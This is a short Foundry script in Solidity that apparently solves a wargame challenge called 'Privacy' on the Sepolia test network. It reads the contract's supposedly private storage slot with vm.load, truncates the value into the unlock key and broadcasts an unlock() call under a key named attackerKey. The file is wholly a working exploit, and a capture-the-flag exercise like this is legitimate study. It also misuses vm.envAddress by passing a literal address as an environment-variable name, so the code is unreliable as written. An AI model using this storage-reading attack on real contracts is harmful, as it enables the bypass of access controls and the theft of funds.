// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyScript is Script {
    function run() external {
        address privacyAddress = vm.envAddress("0xF0011860A963e764b0eb36df6c960dDd06EdC69a");

        Privacy privacy = Privacy(privacyAddress);

        uint256 attackerKey = vm.envUint("PK_SEPOLIA");

        vm.startBroadcast(attackerKey);
        // read depuis 
        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
        bytes16 key = bytes16(data);

        privacy.unlock(key);

        console2.log(" is locked ?", privacy.locked());

        vm.stopBroadcast();
    }
}